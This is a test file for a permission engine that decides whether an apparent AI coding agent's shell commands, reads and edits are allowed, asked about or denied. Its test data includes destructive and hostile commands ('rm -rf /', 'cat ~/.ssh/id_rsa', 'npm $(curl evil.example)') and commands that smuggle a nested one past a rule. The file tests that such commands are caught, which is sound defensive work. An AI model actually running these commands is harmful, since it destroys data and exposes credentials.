import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it } from 'bun:test';
import { PermissionEngine } from '../src/permissions/engine.ts';
import type { PermissionMode } from '../src/permissions/engine.ts';
import { matchBashPattern, matchDomain, matchPathPattern, parseRule } from '../src/permissions/rules.ts';
import type { RuleBehavior } from '../src/permissions/rules.ts';
import { analyzeShell } from '../src/permissions/shell.ts';

function tempProject(): string {
  return realpathSync(mkdtempSync(join(tmpdir(), 'cairn-perm-')));
}

function engine(cwd: string, mode: PermissionMode = 'default', rules: Partial<Record<RuleBehavior, string[]>> = {}): PermissionEngine {
  const parsed = (['allow', 'ask', 'deny'] as const).flatMap((behavior) =>
    (rules[behavior] ?? []).map((text) => parseRule(text, behavior, 'project', cwd)!),
  );
  return new PermissionEngine({ mode, rules: parsed, workingDirs: [cwd], cwd: () => cwd });
}

const bash = (e: PermissionEngine, command: string) => e.check('Bash', { kind: 'bash', command });

describe('shell analysis', () => {
  const commandsOf = (src: string): string[] => analyzeShell(src).commands.map((c) => c.words.map((w) => w.value).join(' '));

  it('splits compound commands on every separator', () => {
    assert.deepEqual(commandsOf('a && b || c; d | e & f\ng'), ['a', 'b', 'c', 'd', 'e', 'f', 'g']);
  });

  it('keeps separators inside quotes as part of the word', () => {
    assert.deepEqual(commandsOf(`echo "a && b" 'c; d'`), ['echo a && b c; d']);
  });

  it('finds commands nested in substitutions and subshells', () => {
    assert.deepEqual(commandsOf('echo "$(rm -rf x)"'), ['rm -rf x', 'echo ']);
    assert.deepEqual(commandsOf('echo `rm y`'), ['rm y', 'echo ']);
    assert.ok(commandsOf('(rm z)').includes('rm z'));
    assert.ok(commandsOf('cat <(rm w)').includes('rm w'));
  });

  it('fails closed on what it cannot fully understand', () => {
    for (const src of [`echo 'unterminated`, 'echo "unterminated', 'npm test &&', 'for f in a; do rm $f; done', 'x=(1 2)', 'echo ${x:-$(rm y)}', `echo $'\\x41'`, 'a )']) {
      assert.equal(analyzeShell(src).parseable, false, src);
    }
    assert.equal(analyzeShell(`echo ${'x'.repeat(10_001)}`).parseable, false);
  });

  it('still reports commands inside control flow, for deny rules', () => {
    assert.ok(commandsOf('for f in a; do rm $f; done').some((c) => c.startsWith('rm')));
    assert.ok(commandsOf('if true; then rm x; fi').includes('rm x'));
  });

  it('parses a commit message here-document without seeing its body as commands', () => {
    const analysis = analyzeShell(`git commit -m "$(cat <<'EOF'\nrm -rf / && echo hi\nEOF\n)"`);
    assert.equal(analysis.parseable, true);
    assert.ok(!analysis.commands.some((c) => c.words[0]?.value === 'rm'));
  });

  it('distrusts an expanding here-document that contains a substitution', () => {
    assert.equal(analyzeShell('cat <<EOF\n$(rm -rf x)\nEOF').parseable, false);
  });

  it('records redirects but not descriptor duplication', () => {
    const [cmd] = analyzeShell('make > out.log 2>&1').commands;
    assert.deepEqual(cmd!.redirects.map((r) => r.target.value), ['out.log']);
  });
});

describe('Bash rule patterns', () => {
  const table: [string, string, boolean][] = [
    ['npm run build', 'npm run build', true],
    ['npm run build', 'npm run build --watch', false],
    ['npm run *', 'npm run build', true],
    ['npm run *', 'npm run', true],
    ['npm run *', 'npm install', false],
    ['git log * main', 'git log --oneline main', true],
    ['git log * main', 'git log main', false],
    ['git log * main', 'git push origin main', false],
    ['* --version', 'node --version', true],
    ['* --version', 'node -v', false],
    ['ls *', 'ls -la', true],
    ['ls *', 'ls', true],
    ['ls *', 'lsof', false],
    ['ls*', 'lsof', true],
    ['* --help *', 'npm --help x', true],
    ['* --help *', 'npm --help', false],
    ['ls:*', 'ls -la', true],
    ['ls:*', 'lsof', false],
  ];
  for (const [pattern, command, expected] of table) {
    it(`${pattern} ${expected ? 'matches' : 'does not match'} ${command}`, () => {
      assert.equal(matchBashPattern(pattern, command), expected);
    });
  }
});

describe('path patterns', () => {
  const cwd = '/work/project';
  const ctx = (behavior: RuleBehavior = 'deny', anchor = cwd) => ({ cwd, home: '/home/me', anchor, behavior });

  it('anchors each prefix form at the right place', () => {
    assert.ok(matchPathPattern('//etc/passwd', '/etc/passwd', ctx()));
    assert.ok(matchPathPattern('~/secrets/**', '/home/me/secrets/a/b', ctx()));
    assert.ok(matchPathPattern('/src/**', '/work/project/src/a.ts', ctx()));
    assert.ok(!matchPathPattern('/src/**', '/src/a.ts', ctx()));
    assert.ok(matchPathPattern('/x', '/settings-dir/x', ctx('deny', '/settings-dir')));
  });

  it('matches bare file names at any depth, but only under the anchor', () => {
    assert.ok(matchPathPattern('.env', '/work/project/.env', ctx()));
    assert.ok(matchPathPattern('.env', '/work/project/a/b/.env', ctx()));
    assert.ok(!matchPathPattern('.env', '/work/.env', ctx()));
  });

  it('treats a single directory segment differently for allow and deny', () => {
    assert.ok(matchPathPattern('src/**', '/work/project/src/app.ts', ctx('allow')));
    assert.ok(!matchPathPattern('src/**', '/work/project/vendor/src/lib.js', ctx('allow')));
    assert.ok(matchPathPattern('src/**', '/work/project/vendor/src/lib.js', ctx('deny')));
    assert.ok(!matchPathPattern('/src/**', '/work/project/vendor/src/lib.js', ctx('deny')));
    assert.ok(matchPathPattern('**/src/**', '/work/project/vendor/src/lib.js', ctx('allow')));
  });

  it('keeps * inside one path segment', () => {
    assert.ok(matchPathPattern('/src/*.ts', '/work/project/src/a.ts', ctx()));
    assert.ok(!matchPathPattern('/src/*.ts', '/work/project/src/d/a.ts', ctx()));
  });

  it.skipIf(process.platform !== 'darwin')('catches a case variant of a denied file on case-insensitive platforms', () => {
    assert.ok(matchPathPattern('.env', '/work/project/.ENV', ctx('deny')));
    assert.ok(!matchPathPattern('.env', '/work/project/.ENV', ctx('allow')));
  });

  it('matches domains exactly or by wildcard', () => {
    assert.ok(matchDomain('domain:example.com', 'example.com'));
    assert.ok(!matchDomain('domain:example.com', 'evil-example.com'));
    assert.ok(!matchDomain('domain:example.com', 'sub.example.com'));
    assert.ok(matchDomain('domain:*.example.com', 'sub.example.com'));
  });
});

describe('rule precedence', () => {
  it('deny beats ask beats allow, whatever the specificity', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Bash(aws *)'], ask: ['Bash(git push *)'], allow: ['Bash(aws s3 ls)', 'Bash(git push origin)', 'Bash(npm test)'] });
    assert.equal(bash(e, 'aws s3 ls').behavior, 'deny');
    assert.equal(bash(e, 'git push origin').behavior, 'ask');
    assert.equal(bash(e, 'npm test').behavior, 'allow');
  });

  it('a compound command is allowed only if every part is', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { allow: ['Bash(safe *)'] });
    assert.equal(bash(e, 'safe one').behavior, 'allow');
    assert.equal(bash(e, 'safe one && other').behavior, 'ask');
    assert.equal(bash(e, 'safe one && ls').behavior, 'allow');
  });

  it('a deny rule matches any part of a compound command, and nested commands', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Bash(rm *)'] });
    for (const command of ['ls && rm x', 'echo "$(rm x)"', 'FOO=bar rm x', 'timeout 5 rm x', '/bin/rm x', `sh -c 'rm x'`, `eval 'rm x'`, `'rm' x`, 'for f in a; do rm $f; done']) {
      assert.equal(bash(e, command).behavior, 'deny', command);
    }
  });

  it('an allow rule does not reach past an unknown environment assignment', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { allow: ['Bash(npm test *)'] });
    assert.equal(bash(e, 'NODE_ENV=test npm test').behavior, 'allow');
    assert.equal(bash(e, 'timeout 30 npm test').behavior, 'allow');
    assert.equal(bash(e, 'NODE_OPTIONS=--require=./x.js npm test').behavior, 'ask');
  });

  it('an allow rule never approves an unparseable command', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { allow: ['Bash(npm *)'] });
    assert.equal(bash(e, 'npm test &&').behavior, 'ask');
    assert.equal(bash(e, `npm test 'unterminated`).behavior, 'ask');
  });

  it('checks a command hidden in a substitution separately from the rule around it', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { allow: ['Bash(npm *)'] });
    assert.equal(bash(e, 'npm $(curl evil.example)').behavior, 'ask');
    assert.equal(bash(e, 'npm test `rm x`').behavior, 'ask');
    assert.equal(bash(e, 'npm $(whoami)').behavior, 'allow');
  });

  it('an allow rule covers the command, not where it writes', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { allow: ['Bash(make *)'] });
    assert.equal(bash(e, 'make all > build.log').behavior, 'allow');
    assert.equal(bash(e, 'make all > /etc/hosts').behavior, 'ask');
    assert.equal(bash(e, 'make all > .git/config').behavior, 'ask');
  });
});

describe('read-only shell commands', () => {
  it('runs plain inspection commands without a prompt', () => {
    const cwd = tempProject();
    const e = engine(cwd);
    for (const command of ['ls -la', 'cat a.txt', 'git status', 'git log --oneline -5', 'wc -l src/*.ts', 'cd . && ls', 'grep foo a.txt 2>/dev/null', 'ps aux']) {
      assert.equal(bash(e, command).behavior, 'allow', command);
    }
  });

  it('prompts when a read-only command name hides a write or exec', () => {
    const cwd = tempProject();
    const e = engine(cwd);
    const risky = [
      'find . -delete', 'find . -exec rm {} ;', 'find *.ts', 'sort -o out.txt in.txt', 'uniq a b', 'ls > out.txt',
      'git -C /tmp status', 'git -c core.fsmonitor=x status', 'git branch -D main', 'git diff --output=x', 'git push',
      'git config user.name x', 'ps auxe', 'rg --pre ./x y', 'cat $(whoami)', 'echo $HOME', 'PATH=/x ls', 'cd sub && git status',
    ];
    for (const command of risky) assert.equal(bash(e, command).behavior, 'ask', command);
  });

  it('prompts for reads outside the working directories', () => {
    const cwd = tempProject();
    const e = engine(cwd);
    for (const command of ['cat /etc/passwd', 'cat ~/.ssh/id_rsa', 'cat ../outside', 'ls /', 'grep --file=/etc/passwd x', 'wc < /etc/passwd']) {
      assert.equal(bash(e, command).behavior, 'ask', command);
    }
  });

  it('follows a symlink before deciding a read is inside the project', () => {
    const cwd = tempProject();
    const outside = tempProject();
    writeFileSync(join(outside, 'secret'), 'x');
    symlinkSync(join(outside, 'secret'), join(cwd, 'link'));
    assert.equal(bash(engine(cwd), 'cat link').behavior, 'ask');
    assert.equal(engine(cwd).check('Read', { kind: 'read', paths: [join(cwd, 'link')] }).behavior, 'ask');
  });

  it('applies Read deny rules to what a shell command reads', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Read(.env)'] });
    assert.equal(bash(e, 'cat .env').behavior, 'deny');
    assert.equal(bash(e, 'wc < .env').behavior, 'deny');
    assert.equal(bash(e, 'cat other').behavior, 'allow');
  });

  it('applies Edit deny rules to redirects and tee', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Edit(/locked/**)'] });
    assert.equal(bash(e, 'echo hi > locked/a').behavior, 'deny');
    assert.equal(bash(e, 'make | tee locked/log').behavior, 'deny');
  });
});

describe('critical removals', () => {
  const critical = ['rm -rf /', 'rm -rf ~', 'rm -rf /usr', 'rm -rf .', 'rm -rf $DIR', 'rm -rf *', 'rm -rf ../..', 'sudo rm -rf /', 'cd x && rm -rf "$(pwd)"'];

  it('always prompts, even with a broad allow rule or in bypass mode', () => {
    const cwd = tempProject();
    for (const command of critical) {
      for (const e of [engine(cwd, 'default', { allow: ['Bash'] }), engine(cwd, 'bypassPermissions'), engine(cwd, 'acceptEdits')]) {
        const decision = bash(e, command);
        assert.equal(decision.behavior, 'ask', command);
        assert.equal(decision.forced, true, command);
      }
    }
  });

  it('becomes a denial in dontAsk mode', () => {
    assert.equal(bash(engine(tempProject(), 'dontAsk'), 'rm -rf /').behavior, 'deny');
  });

  it('leaves ordinary removals to the normal rules', () => {
    const decision = bash(engine(tempProject()), 'rm -rf build');
    assert.equal(decision.behavior, 'ask');
    assert.notEqual(decision.forced, true);
  });
});

describe('permission modes', () => {
  const edit = (e: PermissionEngine, path: string) => e.check('Edit', { kind: 'edit', paths: [path] });

  it('default mode asks before edits and allows reads inside the project', () => {
    const cwd = tempProject();
    const e = engine(cwd);
    assert.equal(edit(e, join(cwd, 'a.ts')).behavior, 'ask');
    assert.equal(e.check('Read', { kind: 'read', paths: [join(cwd, 'a.ts')] }).behavior, 'allow');
    assert.equal(e.check('Read', { kind: 'read', paths: ['/etc/hosts'] }).behavior, 'ask');
  });

  it('acceptEdits allows edits and basic file commands inside the project only', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'acceptEdits');
    assert.equal(edit(e, join(cwd, 'a.ts')).behavior, 'allow');
    assert.equal(edit(e, '/etc/hosts').behavior, 'ask');
    assert.equal(bash(e, 'mkdir -p src/x').behavior, 'allow');
    assert.equal(bash(e, 'mv a.txt /tmp/a.txt').behavior, 'ask');
    assert.equal(bash(e, 'npm install').behavior, 'ask');
  });

  it('never auto-approves writes to protected paths, except in bypass mode', () => {
    const cwd = tempProject();
    const allowAll = { allow: ['Edit', 'Write'] };
    for (const name of ['.git/config', '.cairn/settings.json', '.bashrc', 'sub/.npmrc', '.mcp.json', '.husky/pre-commit']) {
      const path = join(cwd, name);
      assert.equal(edit(engine(cwd, 'acceptEdits', allowAll), path).behavior, 'ask', name);
      assert.equal(edit(engine(cwd, 'bypassPermissions'), path).behavior, 'allow', name);
    }
  });

  it('plan mode refuses changes but allows looking around', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'plan', { allow: ['Edit', 'Bash(npm *)'] });
    assert.equal(edit(e, join(cwd, 'a')).behavior, 'deny');
    assert.equal(bash(e, 'npm install').behavior, 'deny');
    assert.equal(bash(e, 'git status').behavior, 'allow');
    assert.equal(e.check('Read', { kind: 'read', paths: [join(cwd, 'a')] }).behavior, 'allow');
  });

  it('dontAsk turns every prompt into a denial but keeps allowed work running', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'dontAsk', { allow: ['Bash(npm test)'] });
    assert.equal(bash(e, 'npm test').behavior, 'allow');
    assert.equal(bash(e, 'ls').behavior, 'allow');
    assert.equal(bash(e, 'npm install').behavior, 'deny');
    assert.equal(e.check('AskUserQuestion', { kind: 'interactive' }).behavior, 'deny');
  });

  it('bypass mode still honours deny and ask rules', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'bypassPermissions', { deny: ['Bash(curl *)'], ask: ['Bash(git push *)'] });
    assert.equal(bash(e, 'curl x').behavior, 'deny');
    assert.equal(bash(e, 'git push').behavior, 'ask');
    assert.equal(bash(e, 'npm install').behavior, 'allow');
  });
});

describe('hooks and rules together', () => {
  it('a hook approval skips the prompt but not a deny or ask rule', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Bash(rm x)'], ask: ['Bash(git push)'] });
    assert.equal(e.check('Bash', { kind: 'bash', command: 'npm install' }, 'allow').behavior, 'allow');
    assert.equal(e.check('Bash', { kind: 'bash', command: 'rm x' }, 'allow').behavior, 'deny');
    assert.equal(e.check('Bash', { kind: 'bash', command: 'git push' }, 'allow').behavior, 'ask');
  });

  it('a hook approval has no power over plan mode or a critical removal', () => {
    const cwd = tempProject();
    assert.equal(engine(cwd, 'plan').check('Bash', { kind: 'bash', command: 'npm install' }, 'allow').behavior, 'deny');
    assert.equal(engine(cwd).check('Bash', { kind: 'bash', command: 'rm -rf /' }, 'allow').behavior, 'ask');
    assert.equal(engine(cwd, 'plan').check('Edit', { kind: 'edit', paths: [join(cwd, 'a')] }, 'allow').behavior, 'deny');
  });
});

describe('rule details', () => {
  it('a bare deny removes the tool, and a scoped deny does not', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['WebFetch', 'Bash(rm *)'] });
    assert.ok(e.isToolRemoved('WebFetch'));
    assert.ok(!e.isToolRemoved('Bash'));
  });

  it('Edit rules cover Write, and Read rules cover Grep and Glob', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Edit', 'Read(/private/**)'] });
    assert.ok(e.isToolRemoved('Write'));
    assert.equal(e.check('Grep', { kind: 'read', paths: [join(cwd, 'private/a')] }).behavior, 'deny');
  });

  it('a path-scoped Write rule behaves as an Edit rule, so a deny on it still works', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'default', { deny: ['Write(/locked/**)'] });
    assert.equal(e.check('Write', { kind: 'edit', paths: [join(cwd, 'locked/a')] }).behavior, 'deny');
  });

  it('an allow rule with a tool-name wildcard is rejected', () => {
    assert.equal(parseRule('*', 'allow', 'project', '/'), null);
    assert.notEqual(parseRule('*', 'deny', 'project', '/'), null);
  });

  it('checks a symlinked path against restrictive rules at both locations', () => {
    const cwd = tempProject();
    mkdirSync(join(cwd, 'locked'));
    writeFileSync(join(cwd, 'locked', 'real'), 'x');
    symlinkSync(join(cwd, 'locked', 'real'), join(cwd, 'alias'));
    const e = engine(cwd, 'bypassPermissions', { deny: ['Edit(/locked/**)'] });
    assert.equal(e.check('Edit', { kind: 'edit', paths: [join(cwd, 'alias')] }).behavior, 'deny');
  });

  it('suggests exact rules that never contain a wildcard', () => {
    const cwd = tempProject();
    const e = engine(cwd);
    assert.deepEqual(bash(e, 'npm test && git status').suggestions, [{ rule: 'Bash(npm test)', persist: true }]);
    assert.deepEqual(bash(e, 'rm *.tmp').suggestions, []);
  });

  it('expands home in a rule pattern', () => {
    const cwd = tempProject();
    const e = engine(cwd, 'bypassPermissions', { deny: ['Read(~/.ssh/**)'] });
    assert.equal(e.check('Read', { kind: 'read', paths: [join(homedir(), '.ssh/id_rsa')] }).behavior, 'deny');
  });
});
